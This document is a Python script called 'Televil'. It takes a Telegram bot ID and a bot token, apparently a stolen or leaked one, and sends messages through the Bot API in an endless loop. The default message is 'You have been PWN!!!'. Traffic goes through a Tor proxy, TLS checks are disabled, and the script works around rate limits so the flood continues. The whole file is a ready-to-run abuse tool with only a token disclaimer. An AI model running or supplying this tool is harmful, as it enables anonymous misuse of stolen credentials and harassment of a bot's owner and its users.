#!/usr/bin/env python3

########################################################
# Created by: B1n4ry3xpl01t
#
# Disclaimer: Do not use this for evil intentions! Use it with caution!
#######################################################

from pwn import *
from urllib.parse import quote
import requests
import urllib3
import time
import argparse

LOGO = """
 _________        __                  _   __
|  _   _  |      [  |                (_) [  |
|_/ | | \_|.---.  | | .---.  _   __  __   | |
    | |   / /__\\ | |/ /__\\[ \ [  ][  |  | |
   _| |_  | \__., | || \__., \ \/ /  | |  | |
  |_____|  '.__.'[___]'.__.'  \__/  [___][___]


"""

print(LOGO)
print("="*35)
print("")
print("Created by: B1n4ry3xpl01t")
print("")
print("="*35)
print("Disclaimer: Do not use this for evil intentions! Use it with caution!")
print("="*35)

parser = argparse.ArgumentParser(description='Televil is a script that allows you to spam messages into a bot! Tor Service is required!')

parser.add_argument('-id', help='ID of the bot (e.g.: 6907124010) REQUIRED', required=True)
parser.add_argument('-token', help='Token of the bot (e.g.: 48302563512:itjhueorpdEv9j31jy1I5BdScXaWpQhjg) REQUIRED', required=True)
parser.add_argument('-message', '-m', help='Message text to send!')
parser.add_argument('-file-message', help='Reads the message on a file and sets as a text to send!', type=argparse.FileType('r', encoding='utf-8'))
parser.add_argument('-wait', '-w', help='Time to wait for the next message (In seconds)', default=10, type=int)
parser.add_argument('-follow-no-error-time', help='This flag is to disable the following error that Telegram App returns when there are too many requests ocurred it returns how many seconds the application should wait to resume the work again!', default=False, action='store_true')

args = parser.parse_args()

ID = args.id
TOKEN = args.token
time_to_wait = args.wait

USERAGENT = "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
PROXY_HOST = "127.0.0.1"
PROXY_PORT = 9050
PROXY = f'socks5h://{PROXY_HOST}:{PROXY_PORT}'
PROXIES = dict(http=PROXY, https=PROXY)

log.info(f"Hacking into telegram target...")
print("="*35)
log.info(f"ID: {ID}")
log.info(f"Token: {TOKEN}")

MESSAGE = "---------------------------------------\n"
MESSAGE += "         You have been PWN!!!\n"
MESSAGE += "---------------------------------------\n"

if args.message is not None and args.file_message is not None:
    log.error("Cannot set argument Message and File Message at the same time!")

if args.message is None and args.file_message is None:
    log.warn("No message detected on arguments!")
    log.warn("Using default message to spam it!")
elif args.message is  None and args.file_message is not None:
    log.info("Reading message file...")
    log.info("Using custom file message set by user!")
    MESSAGE = args.file_message.read()
else:
    MESSAGE = args.message
    log.info("Using custom message set by user!")

log.info(f"Current message: \n{MESSAGE}")
log.info(f"Time to wait: {time_to_wait}")

MESSAGE = quote(MESSAGE)
URL = f"https://api.telegram.org/bot{TOKEN}/sendmessage?chat_id={ID}&text={MESSAGE}"

urllib3.disable_warnings()
try:
    while True:
        client = requests.request('GET', URL, verify=False, proxies=PROXIES, headers={ 'User-Agent': USERAGENT})
        client_status_code = client.status_code
        is_ok = False

        try:
            client_data = client.json()
            is_ok = client_data['ok']

            if not is_ok:
                if client_data['error_code']==429 and not args.follow_no_error_time:
                    time_to_wait = client_data['parameters']
                    time_to_wait = time_to_wait['retry_after']+2
                    log.warn(f"Waiting for {time_to_wait} to return to my work...")
                    is_ok = True
                    client_status_code = 200
        except Exception as ex:
            log.warn(f"Error on parsing JSON: {client.text}")
            log.warn(f"{ex}")
            pass

        if client_status_code != 200 and not is_ok:
            log.warn(f"Client is no more!!! ({client_status_code})")
            log.info(f"Client Status Code: {client.status_code}")
            log.info(f"Client response: {client.text}")
            break
        time.sleep(time_to_wait)
except KeyboardInterrupt:
    log.warn("Keyboard detected! Turning off the application! See you next time!")

